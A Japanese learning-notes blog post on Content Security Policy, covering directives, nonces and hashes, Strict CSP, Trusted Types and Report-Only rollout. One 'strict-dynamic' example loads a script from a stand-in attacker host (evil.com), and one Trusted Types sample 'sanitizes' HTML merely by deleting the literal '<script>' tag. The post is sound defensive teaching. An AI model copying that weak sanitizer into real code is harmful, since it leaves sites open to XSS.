---
title: フロントエンドを軸としたwebセキュリティ学習まとめ⑤ | 〜CSP（Content Security Policy）〜
tags: JavaScript HTML Security 初心者向け 中級者向け
author: benjuwan
slide: false
---
これは、筆者の「2025振り返り用ひとりアドカレ」記事の一つです。

## はじめに
本記事は、フロントエンドに携わっている筆者がwebセキュリティを学習した際にメモ書きしていたものを体系的にまとめ直した内容です。
かなり長くなったので7記事のシリーズとして投稿していきます。

これまでの開発において、エスケープ処理やサニタイズ、アクセス制御などセキュリティを意識して行ってきましたが、そもそも「**どういった経緯で、どうなる（なってしまう）から、どのような対策が必要となるか**」を深く理解できていない自覚がありました。

そこで【フロントエンド開発のためのセキュリティ入門 知らなかったでは済まされない脆弱性対策の必須知識】をベースに生成AIも使いながらインプットしていきました。

https://www.shoeisha.co.jp/book/detail/9784798169477

もちろん今でもまだまだだと思っていますし、本記事は備忘録の側面が強いかもしれませんが、初学者をはじめ、筆者のように**セキュリティ対策の重要性は理解しているがどこか表層的な部分に留まっているかも**というような方々に少しでも役立つように書いていきたいと思います。

---

## シリーズ目次
- 第1回：Web通信の基礎知識
- 第2回：オリジンとCORS
- 第3回：サイドチャネル攻撃とSite Isolation
- 第4回：XSS（クロスサイトスクリプティング）
- **第5回：CSP（Content Security Policy）**（本記事）
- 第6回：CSRF、クリックジャッキング、その他の攻撃
- 第7回：認証・認可とセキュアな実装

---

先に本記事の結論を書いておきます。

::: note info
CSPは、不明瞭なJavaScript（コード及びファイル）やリソースの読込をブロックして安全性を担保してくれるブラウザ標準機能です。

ただし、**その副作用（JavaScriptの各種制限など）によって意図しない挙動不具合を引き起こす可能性**もあります。例えば、導入によってアプリケーションやサイトの機能が壊れて可用性やユーザービリティに支障をきたすリスクも考えられます。

後述する[Report-Only モード](#report-only-モード)を設定して段階ごとに設定していくのが現実的なアプローチだと思います。
:::

## `CSP`（Content Security Policy）
CSPは、XSSなど不正なコードを埋め込むインジェクション攻撃を検知して被害の発生を防ぐためのブラウザ標準機能です。
サーバから許可されていない JavaScript の実行やリソース読み込みなどをブロックしてくれて、ほとんどのブラウザがサポート済みです。

:::note info
- XSS（クロスサイトスクリプティング）
攻撃者が悪意のあるスクリプトコードを正規のWebサイトに注入し、そのサイトを閲覧する他のユーザーのブラウザで実行させる攻撃。
機密情報の漏洩、Webアプリケーションの改ざん、意図しない操作、なりすまし（ユーザーの機密情報の窃取）、セッションハイジャック、フィッシング攻撃のリスクが生じる。
:::


### CSPの設定方法
CSPは、`Content-Security-Policy`ヘッダをページのレスポンスに含めるか、HTMLの`meta`要素にCSP設定を埋め込むことで有効化できます。

※ただし、HTMLの`meta`要素にCSP設定を埋め込む場合はHTTPヘッダでのCSP設定が優先されたり、一部の設定が使えなかったりするので注意。
  
#### `Content-Security-Policy`ヘッダをページのレスポンスに含める
```bash
Content-Security-Policy: script-src *.trusted.example.com
```

#### HTMLの`meta`要素にCSP設定を埋め込む
```html
<meta 
  http-equiv="Content-Security-Policy" 
  content="script-src *.trusted.example.com"
>
```

### ディレクティブ（ポリシーディレクティブ）
前述の`script-src *.trusted.example.com`のような値の箇所を指します。

**ディレクティブはコンテンツの種類ごとにどのようなリソースを読み込むかの制限指定**を行います。
`meta`要素の場合は`content`属性にディレクティブを指定することになります。

#### `script-src *.trusted.example.com`の場合
- trusted.example.com およびそのサブドメインの（JavaScript）ファイルのみ読込許可
※ディレクティブに指定されていないホスト名のサーバからは、JavaScriptファイルを一切読み込まない（ブロックしてエラーとなる）

#### `'self'`キーワードで自身（のホスト）を対象外にする
**CSPは自身のドメインでホスティングしているJavaScriptファイルの読込も制限する**ので、同一ホストから読み込みたい場合は`'self'`キーワードを指定します。

```bash
Content-Security-Policy: script-src 'self' *.trusted.example.com
```

##### `;`で区切って複数のディレクティブを指定可能
```bash
Content-Security-Policy: default-src 'self'; script-src 'self' *.trusted.example.com
```

#### CSPの代表的なディレクティブ一覧
##### default-src
- すべてのリソースタイプのデフォルトポリシーを設定。指定されていないディレクティブを一括で許可する
- 以下項目に続く、他の`*-src`ディレクティブが指定されていない場合のフォールバック（デフォルト設定）となる

##### script-src
- JavaScriptの実行を制御

##### style-src
- CSSスタイルシートの読み込み（適用許可）を制御

##### img-src
- 画像の読み込み元を制御

##### font-src
- フォントファイルの読み込み元を制御

##### connect-src
- XMLHttpRequest、fetch()、WebSocketなどの接続先を制御

##### media-src
- 音声・動画メディアの読み込み元を制御

##### frame-src
- iframe内で読み込み可能なURLを制御

##### form-action
- フォームの送信先URLを制御

##### frame-ancestors
- iframeなどで現在のページの埋め込み許可を制御

##### upgrade-insecure-requests
- HTTPリクエストを自動的にHTTPSに変換

##### block-all-mixed-content
- 混在コンテンツ（HTTPS内のHTTPリソース）をブロック

##### report-uri
- CSP違反時のレポート送信先URL※Report-Onlyモードのみならず、実際にCSP適用後でもレポート送信は可能

##### sandbox
- コンテンツをサンドボックス化して隔離させることで外部からのアクセスを制御する

---

::: note info
`meta`要素の場合は以下のディレクティブは指定不可能
- frame-ancestors
- report-uri
  - `Report-Only モード`も設定不可
- sandbox
:::

##### CSPに指定できるソースのキーワード
##### 'self'
- 同一オリジン（プロトコル、ドメイン、ポート）のリソースを許可

##### 'none'
- すべてのリソースを拒否

##### 'unsafe-inline'（※セキュリティリスク有）
- script-src や style-src ディレクティブにて、インラインスクリプト（※`<script>`要素を使った記述）やインラインスタイル（※`<style>`要素や`style`属性を使ったスタイル指定）を許可

##### 'unsafe-eval'（※セキュリティリスク有）
- script-src ディレクティブにて eval() や Function() コンストラクタの使用を許可

##### 'unsafe-hashes'（※セキュリティリスク有）
- script-src ディレクティブにて、DOMに設定された onclick, onfoucus などのイベントハンドラーの実行は許可するが、`<script>`要素を使ったインラインスクリプトや`javascript:`スキームを使ったJavaScriptの実行は許可しない

::: note warn
CSPを適用したページでは、明示的に`'unsafe-inline'`キーワードを用いないと**インラインスクリプトやスタイルは禁止されているので使用できなくなります**。

これを回避（して安全にインラインスクリプト・スタイルを実装）するためには、`nonce-source`や`hash-source`と呼ばれるCSPヘッダのソースを利用する必要があります。
:::

### Strict CSP
ディレクティブにホスト名を指定したCSP設定ではXSSの脆弱性が発生するケースもあるらしく、Googleではホスト名を指定する代わりに[`nonce-source`](#nonce-source)や[`hash-source`](#hash-source)を使った「Strict CSP」を推奨しているそうです。

```bash
Content-Security-Policy: 
  script-src 'nonce-r4nd0m123abc' 'strict-dynamic';
  style-src 'nonce-r4nd0m123abc' 'unsafe-inline' https:;
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script'
```

#### 'strict-dynamic'
- 信頼できるスクリプトから動的に生成されたスクリプトを許可

```html
<script nonce="r4nd0m123abc">
  // nonce-source や hash-source が設定されたページでもスクリプトの動的生成は禁止されている
  // しかし、'strict-dynamic'をCSPヘッダに設定しておくことで制限が解除される
  const s = document.createElement('script');
  s.src = "https://evil.com/evilAttack.js";
  document.body.appendChild(s); 

  // ただし、innerHTML や document.write は'strict-dynamic'を使っても無効となる
  document.querySelector('h1').innerHTML = `<span>innerHTML や document.write は'strict-dynamic'を使っても無効</span>`
</script>
```

#### object-src
- `<object>`, `<embed>`, `<applet>`要素の制御
- `object-src 'none'`と指定することで Flash などのプラグインを悪用した攻撃を防げる

#### base-uri
- `<base>`要素（そのページ内のリンクやリソースのURL基準となるURL{例：相対パス}を設定する）で使用可能なURLを制御
- `base-uri 'none'`と指定することで、攻撃者によって罠サイトへのURLへと変更されるような`<base>`要素の挿入をブロックする

#### nonce-source
- 概要: サーバが生成する一意のランダム値（トークン）を使用してスクリプトを許可
- 形式: `'nonce-[BASE64値]'`
- 特徴: リクエストごとに異なる値（トークン）を生成し、予測不可能

```bash
Content-Security-Policy: script-src 'nonce-r4nd0m123abc'
```

#### nonce属性を用いたインラインスクリプトの実行可否の例
※事例は`<script>`要素のインラインスクリプトだが、`<script>`要素を用いたJavaScriptファイルの読込も、同様にnonce属性がないと拒否される。

```html
<!-- 許可されるスクリプト -->
<script nonce="r4nd0m123abc">
  console.log('This script is allowed');
</script>

<!-- 拒否されるスクリプト（nonceなし） -->
<script>
  console.log('This script is blocked');
</script>
```

`nonce-source`が有効なページでは、`onclick`属性などで指定されたイベントハンドラーの実行が禁止されます。
対応としては`addEventListener`でクリックイベントを指定することです。

#### hash-source
スクリプトやスタイルの内容をハッシュ化（ハッシュ値を指定）して許可するという仕組みです。
ハッシュ値が異なればそのスクリプトは実行されないので hash-source は常に同じ値でも問題ありません。

HTML, CSS, JavaScript のみで構成された静的サイトの場合、リクエストごとに nonceの値を生成できないが、 hash-source だと安全にCSPを設定できます。

- 形式: `'sha256-[ハッシュ値]'`, `'sha384-[ハッシュ値]'`, `'sha512-[ハッシュ値]'`
- 特徴: スクリプトの内容が変更されるとハッシュ値も変わるため、改ざんを検知可能

```bash
Content-Security-Policy: script-src 'sha256-xyz123...'
```

### Trusted Type
Trusted Typeとは、WebアプリケーションでXSS攻撃を防ぐためのWeb標準APIを指します。

危険なDOM APIへの**文字列の直接代入を制限**し、代わりに「信頼できる型」を使用する（＝**ポリシーを強制する**）ことで悪意のあるスクリプトの実行を防ぎます。

この「ポリシーの強制」がポイントです。

例えば、サニタイズ処理用の関数を用意していたとしても開発者の実装漏れリスクが考えられます。
しかし、Trusted Typeを指定しておけば（ポリシー強制によって）漏れの心配がなく、リスク検知を行ってくれるのです。

#### CSPでの設定
- HTTPヘッダ
```bash
Content-Security-Policy: require-trusted-types-for 'script';
Content-Security-Policy: trusted-types myPolicy defaultPolicy;
```

- `meta`要素
```html
<meta http-equiv="Content-Security-Policy" 
      content="require-trusted-types-for 'script'">
```

- 実装例
```js
// ポリシーの作成
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (string) => {
    // サニタイズ処理
    return string.replace(/<script>/gi, '');
  }
});

// 安全な使用方法
element.innerHTML = policy.createHTML('<div>安全なHTML</div>');

// これはエラーになる（文字列の直接代入）
// element.innerHTML = '<div>直接代入</div>'; // TypeError
```

```js
// ブラウザ対応チェック付き
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('sanitizer', {
        createHTML: (string) => {
            // DOMPurifyなどを使用
            return DOMPurify.sanitize(string);
        }
    });
    
    element.innerHTML = policy.createHTML('<p>コンテンツ</p>');
} else {
    // Trusted Types未対応の場合
    element.innerHTML = '<p>コンテンツ</p>';
}
```

#### 制限対象となるDOM API
- innerHTML, outerHTML
- insertAdjacentHTML
- document.write（※現在非推奨）
- eval
- `<script>`要素の src属性など

#### 型の種類：
- TrustedHTML：HTML文字列用
- TrustedScript：JavaScript文字列用
- TrustedScriptURL：スクリプトURL用

### Report-Only モード
CSPは、XSSを防ぐ強力な手段ですが間違った実装をすると（JavaScript）プログラムの動作不具合を引き起こす可能性もあります。

そこで、**CSP適用時にWebアプリケーションの動作チェックを担うテストのために用意されているのが「Report-Only モード」** です。

::: note info
CSPの実施においては、Report-Only モードで数週間～数か月運用してみてCSP違反がないことを確認した上で実施し、**CSP適用後もレポートを送信して監視を続けることが推奨**されています
:::

#### 段階的なCSP導入ロードマップ
##### 1. Report-Onlyモードで検証
```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

##### 2. 基本的な制約を適用
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
```

##### 3. Strict CSPへ移行
```
Content-Security-Policy: 
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none'
```

#### Report-Only モードの概要
Report-Only モードとは、CSP適用時に発生する影響をまとめたレポートをJSON形式（かつPOSTメソッド）で送信する機能です。

Webアプリケーションには実際に適用しないので影響はないものの、もし適用していた場合の不具合検証ができます。

##### Report-Only モードの設定
Content-Security-Policy-Report-Onlyヘッダを使用する

- HTTPヘッダ
```bash
Content-Security-Policy-Report-Only: default-src https:;
  report-uri /csp-report-url/;
  report-to csp-endpoint;
```

実際に活用する際は、サーバへ送信されたJSONデータをデータベースなどに保存しておき、適切なツール（例：`Redash`など）を使って開発者がレポート内容を検索しやすくしておくのが推奨されています。

その際、User-Agent などヘッダの情報も保存しておくとユーザーが使用したブラウザ情報なども確認できるのでエラー調査に役立ちます。

::: note alert
**`meta`要素では、Report-Only モードの設定は不可能**なので注意
:::

## さいごに
ここまで読んでいただき、ありがとうございました。

筆者の知識・経験不足から間違った点や、誤解を招きかねない表現がありましたらご教示・ご指摘いただけますとありがたい限りです。

